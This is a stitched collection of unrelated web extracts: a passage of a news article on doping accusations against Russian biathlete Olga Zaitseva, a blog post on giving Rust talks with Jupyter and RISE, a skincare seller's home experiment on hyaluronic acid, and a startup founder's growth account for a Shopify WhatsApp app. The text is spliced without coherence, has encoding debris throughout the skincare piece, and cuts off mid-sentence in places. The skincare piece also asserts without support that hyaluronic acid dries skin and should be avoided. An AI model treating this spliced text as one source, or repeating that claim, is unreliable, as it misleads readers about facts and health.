<p>This includes events that allegedly took place in Sochi. What is known about them is largely attributable to the descriptions and records of a key witness: Grigory Rodchenkov, 61. The chemist headed Russia’s national anti-doping laboratory until 2015, when he moved to the United States. There, he shared his account of what allegedly happened in Sochi with the <em>New York Times</em>. In his version of events, the urine of Russian medal candidates contaminated with banned substances at the Winter Games were secretly swapped with clean urine, presumably with the help of Russia’s secret service, the FSB. Rodchenkov has led such an exuberant life that Netflix even made the two-hour documentary film "Icarus” about it.</p><p>WADA appointed a special investigator, and subsequent analyses of Russian urine samples from Sochi revealed indications of urine tampering. Ultimately, the IOC felt the circumstantial evidence was strong enough to sanction the athletes. In several affidavits, Rodchenkov provided the names of athletes who were allegedly doped in Sochi and presented lists of competitors who, he claimed, were provided with protection by the Sports Ministry. Three years ago, this led the IOC to sanction 43 athletes and remove them from the results lists of the Sochi Olympics.</p><p>Almost all of those cases were appealed, and 28 were successful in getting the decision overturned. The decisions to reverse the sanctions were made due to insufficient evidence. Three rulings are still pending - the one for Zaitseva and the other two biathletes.</p><p><strong>A "Made-Up Story”</strong></p><p>Zaitseva claims that Rodchenkov’s portrayal of events is a "made-up story.” In a video call from Moscow, she says she has never seen him in her life. So why does he mention her explicitly in documents, in one case even describing a meeting with her? "I have no explanation for all these lies,” Zaitseva says, "except that he must be crazy.”</p><p>Rodchenkov claims that Zaitseva doped using EPO, a blood booster, and that, like many Russian medal candidates, she was given what was called the "Duchess cocktail,” a mixture of three anabolic steroids.</p><p>"None of it is true," says Zaitseva.</p><p>Wolfgang Pichler also believes the story about "this cocktail is total rubbish.” The Bavarian is considered one of the world’s best biathlon coaches and known as a champion of doping-free sports. After German reunification, he campaigned against the German Ski Association accepting former East German coaches who had been suspected of involvement in the regime’s doping programs. In 2009, he also demanded the exclusion of Russian biathletes from the Olympic Games following doping revelations. Then he became Russia’s head coach in 2011, and later took over a five-person training group that included Zaitseva.</p>
</div>

<div>
<p>The main training center was set up in Pichler’s hometown of Ruhpolding. Most of the other training camps also took place in Europe. "We were almost entirely under WADA’s control,” Pichler says. He also took blood from his charges each day of training to determine stress limits. If one of his charges had doped, he says he would have noticed.</p><p>But what about the cocktail? "A pipe dream,” Pichler claims. The coach says he said the very same thing during a hearing in Lausanne, Switzerland.</p><p>Four doping samples were taken from Zaitseva at Sochi – three urine and one blood. During follow-up analyses, investigators argued that the salt concentration in a urine sample was too high.</p><p><strong>Natural Cause Could not Be Ruled Out</strong></p><p>But experts believed that wasn’t enough to suggest the sample had been tampered with. Two expert opinions, including one from a renowned New York institute, were submitted during the Lausanne proceedings. Both stated that a natural cause for Zaitseva's salt value could not be ruled out. Zaitseva says she has always had a high-sodium diet, with lots of smoked salmon and red caviar, which were also served at the cafeteria in the Olympic Village.</p><p>The IOC re-examined Zaitseva’s blood sample, with negative results. If Zaitseva had cheated, they ought to have found traces of EPO- or anabolic doping. Unlike the urine samples, the blood samples at the Olympics were never secretly swapped.</p><p>Rodchenkov's statements about Zaitseva reach beyond Sochi. He claims, for example, that the biathlete ended her career at the end of 2014 by order of the Sports Ministry, because her blood values hadn’t normalized. Zaitseva did in fact announce her resignation in January 2015. "I was pregnant,” she says, nothing else. Her second son was born that October.</p>

<p>The test results from another urine sample the IOC introduced as evidence in the proceedings against Zaitseva also fall into this context. The sample is from October 2014 and contains DNA from two people – Zatiseva’s and, it would later be revealed, from a man. The IOC investigators considered this to be further evidence of fraud.</p><p>Zaitseva says she was shocked when she found out about it. "How do you think it feels to have to tell your husband that male DNA was found in your urine? That story could have destroyed my family.” It took years to identify the foreign DNA. According to the forensic reports viewed by DER SPIEGEL, it came from Zaitseva’s husband. They say the couple likely had sex shortly before the doping test.</p><p><strong>"It’s Like Getting Accused of Murder”</strong></p><p>Zaitseva says yes, she was trying to get pregnant at the time. She says the proceedings destroyed her reputation. "It’s like getting accused of murder, even though you haven’t hurt anyone,” she says.</p><p>She fought back, along with the other biathletes who had been accused of doping, and filed a lawsuit against Rodchenkov in New York. Mikhail Prokhorov, a man as glamorous as he is influential, is covering some of the costs of the women’s suit. The Russian billionaire is the former president of the Russian Biathlon Association and was the owner of the Brooklyn Nets NBA basketball team, among others.</p><p>The proceedings in the New York case are currently in recess. Both sides have agreed to wait for the outcome of the CAS ruling. The Russian side is counting on a reversal of the sanctions in Lausanne, which they believe could shift the lawsuit in the …</p></div></div></div>

            <section>
                <div>
                    <p>I sometimes give talks at the <a href="https://oradeatechhub.ro/">local tech hub</a> in the city where I live. It's not a big community, but I enjoy giving talks and they often provide a necessary deadline and motivation to finish some projects. </p><p>Last week I gave a talk about Rust. Given that there are still some restrictions on how many people get be in one room, the physical audience was only 10 people, but there was a livestream as well. </p><p>Until now, I had used Google Slides for my presentation. For talks that don't have a lot of code, it works fine. But when you are presenting lots of code (such as a tutorial for a programming language), I found Slides to be lacking. If you paste in the code directly, you can't have syntax highlighting. You can paste in a screenshot, but then any later modifications to the slide mean retaking the screenshot and replacing it, so it's more work.</p><p>You can present in an IDE, but sometimes you want to have slides with normal text between pieces of code, where you explain some things. Switching between two apps can quickly get annoying. Also, it's hard to prepare just "bite-sized" content in an IDE, but that is needed so that the audience is focused only on what you are explaining right now. </p><p>So I decided to try something new for my intro to Rust presentation: I used Jupyter Notebook with a several extensions and I think it worked pretty well (except for a bug towards the end of the presentation). </p><p>For this I used the <a href="https://rise.readthedocs.io/en/stable/support.html">RISE extension</a>, which adds live slide show support to Jupyter, using <code>reveal.js</code>. Each cell can be either a new slide, a sub-slide (so to get to it you have to "navigate down", in reveal.js style), a fragment (so it shows up on the same slide, but on a subsequent click), or notes. You can write new code and run it even during slideshow mode, so it's very useful if someone in the audience has a question, you can quickly write down and execute code to answer them. RISE is simple to install:</p><pre><code>&gt; pip install RISE
</code></pre><p>Then I used a bunch of extenstions that are bundled together in the <code><a href="https://jupyter-contrib-nbextensions.readthedocs.io/en/latest/install.html">jupyter_contrib_nbextensions</a></code> package. By default, you have to enable and configure them by editing JSON files, but there is another plugin to add a dashboard for them, called <code><a href="https://github.com/Jupyter-contrib/jupyter_nbextensions_configurator">jupyter_nbextensions_configurator</a></code>. They can be installed with:</p><pre><code>&gt; pip install jupyter_contrib_nbextensions
&gt; jupyter contrib nbextension install --user
&gt; pip install jupyter_nbextensions_configurator
&gt; jupyter nbextensions_configurator enable --user</code></pre><p>You have to restart the Jupyter process and now you will see a new tab on the home page of the local Jupyter page, where you can enable and configure all the installed extensions. </p><figure><img src="https://rolisz.ro/content/images/2020/07/image.png"></figure><p>I used the "Hide input" extension. Most of my code was organized into two cells. One which didn't contain all the code, just a snippet on which I wanted to focus (for example, I made a small change to a previously defined function), and another one which could be run and showed output. The latter cell was hidden with this extension, so that only the output could be seen. </p><figure><div><div><p><img src="https://rolisz.ro/content/images/2020/07/hiddencell.png" width="3634" height="1657"></p><p><img src="https://rolisz.ro/content/images/2020/07/revealed_cell.png" width="2082" height="1657"></p></div></div><figcaption>Left: snippet cell and output of hidden cell in slide view. Right: snippet cell, revealed hidden cell and it's output in notebook view</figcaption></figure><p>Initially I also used the "Split cell" extension. This extension gives you a button which can make a cell to be half width. If two consecutive cells are half width, they align next to each other, making two columns. I wanted to use this to have code on the left column and explanations on the right column. This would have worked if the presentation was online only, because I wouldn't have had to zoom in too much. But because in the last week before the presentation we found out that it was allowed to hold the presentation in person (with 10 people in the audience) and I had to present on a projector and zoom in, I ended up removing all the split cells because the content wouldn't fit in any longer. </p><h2 id="making-rust-work-with-jupyter">Making Rust work with Jupyter</h2><p>All the above is generic and can be made to work with anything that works in Jupyter. To make Rust work in Jupyter you need a kernel for it. Some guys from Google have made one called <code><a href="https://github.com/google/evcxr/blob/master/evcxr_jupyter/README.md">evcxr_jupyter</a></code>. </p><p>It's fairly straightforward to install. On Windows you need to first install CMake and then you run:</p><pre><code>&gt; cargo install evcxr_jupyter
&gt; evcxr_jupyter --install</code></pre><p>After restarting the Jupyter process, you now have the option of using a Rust kernel. To include Cargo dependencies, you can insert the following into a cell:</p><pre><code>:dep reqwest = { version = "0.10", features = ["json", "blocking"] }</code></pre><p>This downloads <code>reqwest</code> , compiles it and makes it available for using in other cells. </p><p>The notebook for presentation that I gave can be found in <a href="https://github.com/rolisz/presentations/blob/master/Web%20crawler%20in%20Rust.ipynb">a Github repo</a> and the recording can be found <a href="https://www.youtube.com/watch?v=sLIFCsU_Z7E&amp;feature=youtu.be">here</a>. </p><p><em>I’m publishing this as part of <a href="https://100daystooffload.com/">100 Days To Offload</a> - Day 27.</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
    <p>By Wendy Ouriel</p>

<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>




<p>How do you know if someone is a vegan, a runner, or bought a house in Malibu in 1970 for $15Â&nbsp;and it's now worth $40 million? Because they'll tell you. You can also count that if a skin care company uses hyaluronic acid they will tell you thatÂ&nbsp;it holds 1000x its weight in water.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>






<p>Well IÂ&nbsp;put that ad nauseam claim to the test. And I found that hyaluronic acid does not hold 1000x its weight in water. It doesn't hold 500x its weight in water, it doesn't even hold 100x its weight in water. I found that hyaluronic acid only holds about 10-50x its weight in water.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp;Â&nbsp;</p>






<p>PerhapsÂ&nbsp;more egregious than the thoroughly false claim, is that there is not a clear-cut way to determine how much hyaluronic acid actually absorbs, which is why I could only give a range of 10-50x in my results. Hyaluronic acid forms a gel when saturated, but there is not a subjective way to determine when that "gel" is fully saturated, and thus you cannot weigh the fully saturated gel to determine how much water was absorbed. I expected that I could filter the fully saturated gel from the water that wasn't absorbed, weigh it, and determine how much water was absorbed by the hyaluronic acid. I was not able to do that because the gel varied in thickness, or just changed the thickness of the water to such a slight degree it wasn't measurable.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>






<p>I used hyaluronic acid of varying sizes to determine if there was a variation in the absorbency based on theÂ&nbsp;mass of the molecule. Hyaluronic acid is measured in daltons. Daltons areÂ&nbsp;used to measure something very low in mass, on the atomic level. 1 dalton = 0.00000000000000000000000166054 grams.Â&nbsp; Â&nbsp; Â&nbsp;</p>

<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;Â&nbsp;</p>








<p>There was also a high degree of variation between the absorbency for hyaluronic acid depending on the molecular weight. High molecular weight, low molecular weight, and super low molecular weight had a similar absorbencies, butÂ&nbsp;ultra low molecular weight was barely able toÂ&nbsp;hold onto any water at all.Â&nbsp;</p>

<h4>Materials used in this experiment:</h4>

<p>Hyaluronic acid high molecular weight (HMW): 1.0-1.5 million daltons</p>
<p>Hyaluronic acid low molecular weight (HLW): 0.8-1.0 million daltons</p>
<p>Hyaluronic acid super low molecular weight (HSLMW): &lt;50,000 daltons</p>
<p>Hyaluronic acid ultra low molecular weight (HULMW): &lt;6,000 daltons</p>

<p>Distilled water</p>

<h4>Experimental methods and results</h4>
<p>The first part of the experiment, I went right to the claim that hyaluronic acid absorbs 1000x its weight in water. I weighed out 1g of HA for all molecular weights (HMW, HLW, HSLMW, HULMW) and placed this in 1000g of distilled water.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0202_large.JPG?v=1585939704" alt="">Â&nbsp;<img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0201_large.JPG?v=1585939693" alt=""></p>
<h6>Pictured here is 1g of HA and 1000g of water (quarter shown for scale). As you can see it is a bold claim to state that such a small amount of HA can absorb that much water. Experimentally, this would mean that the HA would turn the water into a thick gel when added. This did not happen.</h6>
<p>Â&nbsp;</p>
<p>I then let the mixture sit for two days to allow for total absorption to occur.</p>
<p>After two days the mixture looked no different than regular water. There was no discernible change in thickness. I filtered out the mixture to determine if any gel had formed, indicating absorption and no gel was obtained.</p>
<p>This means that hyaluronic acid did not absorb 1000x its weight in water. It did not even come close enough to that figure to be measured.</p>
<p>I repeated the above protocol for 500x HA's weight in water, 250x its weight in water and 100x its weight in water. At 100x its weight in water, there was some thickening of the water for HMW, HLW and HSLMW, but not for HULMW. These findings indicate that HA was beginning to show saturation, but this is 10x less than the claims of 1000.Â&nbsp;</p>
<p>When HMW, HLW and HSLMW was put in 50x its weight in water, a semi-thick gel (hair-gel consistency) formed. However, this was not how HA is supposed to look when fully saturated, indicating it was not able to fully absorb 50x its weight in water. Therefore I had to add less water to the mixture to determine HA's saturation point. It is also important to note that the gel thinned after day 2 and someÂ&nbsp; water precipitated to the top, indicating that some of what HA absorbed was later lost.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0194_large.JPG?v=1585939657" alt=""></p>
<h6>Gel pictured here formed at 50x weight in water, however the thinness of the gel indicated that HA was not able to fully absorb all of the water in its environment.Â&nbsp;</h6>
<p>The next step was to put HMW, HLW and HSLMW in 10x its weight in water. It was at this point that a fully saturated gel formed. This gel was dense, and had the properties of HA when fully saturated. It was only at this time that gel clumps were formed in the water, and could be decanted and weighed to determine how much HA was actually able to absorb.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0199_large.JPG?v=1585939670" alt=""></p>
<h6>This gel, obtained by putting HA in 10x its weight in water had the thickness consistent with fully saturated hyaluronic acid.Â&nbsp;</h6>
<p>Â&nbsp;</p>
<p>This experiment told me that hyaluronic acid does not hold 1000x its weight in water, but it also told me something far more important. This experiment told me that there isn't sound scientific protocol for determining how much water hyaluronic acid is capable of absorbing. There was a varying degree in the thickness of the gels depending on how much water was added, and there wasn't a point in any of the experiments where I could subjectively and definitively determine where hyaluronic acid was fully saturated. A gel only started to form around the 50x its weight point, and the gel seemed to be fully saturated only around the 10x its weight point. The problem here is that it is fully up to the researcher to give a ballpark estimate based on their own perception to determine how much of hyaluronic acids weight it is actually able to absorb in water. That means that the science behind hyaluronic acid's absorption claims is somewhat dubious.Â&nbsp;</p>
<p>At the end of the day, it does not really matter how much water hyaluronic acid can absorb, from a skin care standpoint, because it is an ingredient that should be avoided due to its drying effect. It doesn't absorb into the skin and plump it, so who cares if it can absorb 10x its weight or 1000x its weight. Its all meaningless.</p>
<p>But what does matter is that a claim that has been parroted by every skin care company who uses it is completely false. And whats worse is thatÂ&nbsp;unsubstantiated hearsay is being passed off as scientific, and is repeated so often people take it at face value without any further research. None of these companies did their own research to back up the claim. They just repeated it and deceived everyone. Nothing about that is scientific.Â&nbsp;</p>
<p>It is about time that the real science stands up.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>14 months ago, my co-founder <a href="https://twitter.com/sankalpjonna" target="_blank">Sankalp</a> and I set out to build a business that can sustain our livelihood while allowing us the freedom to live life on our terms. </p><p>When we started, we each had roughly 12 months of savings to survive on, assuming we made $0. Hence our minimum goal was to make $1,500/mo and the case where we would be celebrating with champagne was set to $3,000/mo.</p><p>We launched our app on April 24, 2019. The first paid plan was launched on June 4, 2019. Around the same time, we got <a href="https://www.preetamnath.com/blog/shopify-micro-saas-growth" target="_blank">featured by Shopify</a>. Here's a <a href="https://apps.shopify.com/whatsapp-chat-button" target="_blank">link to the app</a> if you want to check it out.</p><p>14 months later, we grew past $25,000 in MRR while remaining a 2 person team.</p><figure id="w-node-e5ce9f7f0ba4-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004959a0b62d53946fd901_shopify%20earnings%20growth.png" alt=""></p><figcaption><em>Note:&nbsp;Earnings reflect after a 1 month delay</em></figcaption></figure><p>I’m so proud of what we have built here.</p><p>If life is a video game, and there’s 100 levels to it, I feel like we have finally crossed level 1.</p><p>Here's what we've been up to in the 14 months since launch:</p><ul role="list"><li>20,000 active merchants (users) on the app</li><li>1,500+ paying merchants (customers)</li><li>450,000 automated WhatsApp messages sent in June</li><li>2.2 million WhatsApp chat messages initiated in June</li><li>Highest rated 5.0 🌟 app for all things WhatsApp with 500+ reviews</li><li>Users from 50+ countries around the world</li></ul><figure id="w-node-0cd8870c808c-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f007ba5d6c3b3532b0aa784_paying%20customers%20countries.png" alt=""></p></figure><p>We did a lot of things right, but we also messed up here and there. I've tried to capture an honest and accurate account of our journey so far.</p><h2>11 key learnings and mistakes from our journey<br></h2><h3>1- Learning: Always keep moving the needle</h3><p>Running your own business and having 100% freedom and flexibility is a gift or a curse, depending on how you use it. It’s easy to get lost in building, polishing, bringing your ideas to life. But remember, the only things that matter are what move the needle. </p><p>For every decision related to your business, you should always run it through a set of questions that help you filter out whether your idea is aligned to your business goals.</p><ul role="list"><li>Does it help our app get more users</li><li>Does it help convert more users to paying customers</li><li>Does it help users derive more value and ROI from the app</li><li>Does it meaningfully improve user experience</li><li>Does it reduce our support ticket load</li><li>Does it have any unintended 2nd order consequences that can bite us later</li></ul><p>Ultimately, you want to keep making decisions that move the needle for your business - by bringing you more customers and revenue, or making it easier and less time consuming to run the business (if that’s one of your goals, it is for us).<br></p><h3>2- Learning: Help users realise value as soon as possible</h3><p>From our research, we learnt that Shopify merchants are mostly solopreneurs or teams of 2-10. They are always time and resource crunched.</p><p>We wanted to enable our users to start using the app with the least amount of setup time or steps. This reflects in in the user experience of the app. </p><p>For example, when a first time user enters their phone number and hits the “Save” button, at this time the user is looking to test our app and see if it fits their needs. We speed that up by&nbsp;automatically enabling the chat button on first save, along with the best default configuration for all chat button related settings.</p><figure id="w-node-4b9a52f7ced2-2f0d8df6"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/o3oeGyv-JJs"></iframe></p></figure><p>Another example, when a user wants to start sending automated messages, all they have to do is click on the “Enable” button. All the app’s default configuration is automatically applied and the user can start seeing value immediately.</p><figure id="w-node-4bee860d412d-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004a6e594ffa16384d47ca_automated-message-setup-1.png" alt=""></p></figure><figure id="w-node-8c9743f7a3e0-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004a858d5f7ceaad74de97_automated-message-setup-2.png" alt=""></p></figure><h3>3- Learning: Care about your users, they can feel it</h3><p>Users are on a mission to achieve their goals. They typically need your help when there’s something that stops them from getting there.</p><p>From day 1, we were clear on providing the best possible support. Our users would be thrilled to see bug fixes deployed in 15 minutes, WhatsApp &amp; email replies in 5 minutes, and so on. We were fast, we were responsive.</p><p>This worked in our favour - users showered us with positive reviews which is how we managed 500+ reviews while staying 5.0 star rated.</p><figure id="w-node-f55f45993a1f-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004affbd3802acac60056d_superlemon%20whatsapp%20app%20shopify%20reviews.png" alt=""></p></figure><p>But customer support isn’t only about getting reviews. We’ve had users who prefer using our app instead of competitors because</p><p><strong>A-</strong> We reply quickly</p><p><strong>B-</strong> We proactively provide information beyond the immediate premise of the query</p><figure id="w-node-e499fce41f50-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f0065d67e883834a7802cc8_review-users-care.png" alt=""></p><figcaption><em>Your users can feel when you genuinely care about them</em></figcaption></figure><h3>4- Learning: Be smart about managing and reducing support ticket volume</h3><p>The downside of trying to be a customer support hero is, you only have finite hours in the day, and you don’t want to spend most of it replying to customers. </p><p>We took 3 specific initiatives to reduce support tickets.</p><p><strong>1- Embed FAQs within the product</strong></p><p>We found that users would have FAQs around specific features, and they wouldn’t really go to the help center and reference it. To them, it’s simpler to ask for help.</p><p>To solve this problem, we embedded FAQs inside the product itself. </p><p>Here are a few examples where we included the most commonly asked question beside the feature configuration. </p><figure id="w-node-1def5927520e-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004c97d6c3b3b5f30a4556_faq-inside-product-1.png" alt=""></p></figure><figure id="w-node-11706312cf8a-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004ca08216b9c33aaef853_faq-inside-product-2.png" alt=""></p></figure><figure id="w-node-9239f016ade1-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004ca87bc6f87761475470_faq-inside-product-3.png" alt=""></p></figure><p>The results were always immediately noticeable. Where we would get 10 questions a week about X, would drop to 1-2, thereby freeing us up from answering repetitive support questions.</p><p><strong>2- Fix repetitive bugs</strong></p><p>If a bug appears more than thrice in a span of days, the third time is when we go ahead and permanently fix it. Why thrice? That way we don’t overwhelm ourselves with trying to fix every single bug, but only the ones that appear repeatedly and take up support time.</p><p><strong>3- Remove WhatsApp chat support and go with Email only</strong></p><p>During initial days, we found it useful to let our users contact us on WhatsApp. It lead to tons of conversations which shaped our understanding of the user’s needs and how we can better solve them. </p><p>But having WhatsApp as a support channel had 3 issues:</p><p><strong>1-</strong> With time, we discovered that people find dropping a message on WhatsApp to be very low barrier. Which means they wouldn’t take a moment to look around, be patient enough to find out how the issue that they are about to describe has already been solved inside the app. It’s just easier to WhatsApp us.</p><p><strong>2-</strong> We also discovered that users had an unrealistic expectation of quick replies and quick resolutions on WhatsApp. Granted, we would be quick whenever possible. But if it’s 11pm at night and the user asks if a bug is fixed 10 minutes later, it can get a bit annoying.</p><p><strong>3-</strong> I started dreading picking up my phone, seeing it full of support tickets every morning.</p><p>To solve this, we removed the WhatsApp chat button from our own app, and replaced it with an Email support button instead. All 3 problems listed above got resolved to a great degree.</p><figure id="w-node-09f7b09a3b19-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004d01e45cb8848d6cf0f7_Email%20support%20only.png" alt=""></p></figure><p>We also made numerous smaller tweaks to optimise our support flow. One of the tiny but powerful tweaks was to automatically populate the email subject line with the user’s Shopify store url. That made it so much faster for us to look up the specific user instead of a meaningless back and forth of “what’s your store url”.</p><figure id="w-node-280b459e613d-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f00533cbd380208b160157f_store%20url.jpg" alt=""></p></figure><p>Our efforts have paid off. Unless we’re building new features, we spend only about <strong>15-30 minutes per day</strong> on customer support.<br></p><h3>5- Learning: Say No, often</h3><p>Users ask for all sorts of functionality. It doesn’t mean you should build them. </p><p>Whenever we get feature requests, we add a card in our internal Notion board and judge the card against 3 factors</p><p><strong>1-</strong> how many times do we receive the same request</p><p><strong>2-</strong> does the feature align with the rest of our product</p><p><strong>3-</strong> does the feature add core value to the user</p><p>Many times, we found users requesting features that would save them the hassle of using another app. Now, if that functionality enhances the rest of our app, it’s the right feature to add. But if it doesn’t, then we politely decline.</p><figure id="w-node-2831ff295f9b-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f00517014696c60a040b940_politely%20saying%20no.png" alt=""></p></figure><p>There are 2 types of responses we give to customers regarding feature requests:</p><p><strong>1-</strong> Tell them that this feature isn’t requested by other users that much, and since we are a small team with limited resources, we may not be prioritising this feature in the near future.</p><p><strong>2-</strong> Tell them that this feature is already part of our roadmap, and that we will reach out to them whenever it’s ready. I generally avoid giving timelines, to account for “life happens, plans change”.</p><p>This learning extends beyond just feature requests. </p><p>In the past year, we have received tons of business proposals, partnerships, integration requests, collaborative marketing invitations etc. Saying No allowed us to remain focused on what’s really important.<br></p><h3>6- Mistake: Optimise top of the funnel</h3><p>I was under the impression that during build phase, we shouldn’t focus too much on optimisation. After all, you don’t want to get busy squeezing another 10% when the potential is to 10x. </p><p>In most cases, I think I made the right call. One place I made the wrong call was the user onboarding flow.</p><p>Until March 2020, users would install the app and directly land on the chat settings page, which is the starting point of the user’s journey. We were getting a steady flow of 10-15 paid trials initiated per day. </p><p>Adding a step of friction before this would be counterintuitive, right? It couldn’t possibly increase trials, right?</p><p>Sigh. </p><p>When we added one screen which asked the user upfront whether they want to continue with the Free plan, or start a trial for the Paid plan, daily paid trials DOUBLED overnight, while trial-to-paid conversion rate remained steady at 50%. </p><figure id="w-node-c2d582bcc858-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004d9fda26a209aa082a72_onboarding%20trial%20doubled.png" alt=""></p></figure><p>The experiment took us a day to build, and after a week we concluded what was clearly the winner.</p><p>I normally advocate for focusing on building vs optimising in the early stages, but in this case I didn’t know that optimisation was waiting to unlock 100% increase in trials.</p><p>My takeaway here is - always keep your eyes open for bottlenecks at the top of funnel. </p><p>If there’s copy on your website, or a specific sign up flow that might be holding you back from getting 2x the users, you need to unblock it early and realise compounded gains over time.<br></p><h3>7- Mistake: Competition will copy, don’t completely ignore them</h3><p>In the past year, we’ve seen competitors copy our app interface, in-app descriptions, button designs, app listing text word-for-word in many cases. Initially we were furious, but instead we kept our head down and focused on customer’s needs. </p><p>Eventually we started ignoring our competitors, which was a mistake. While …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
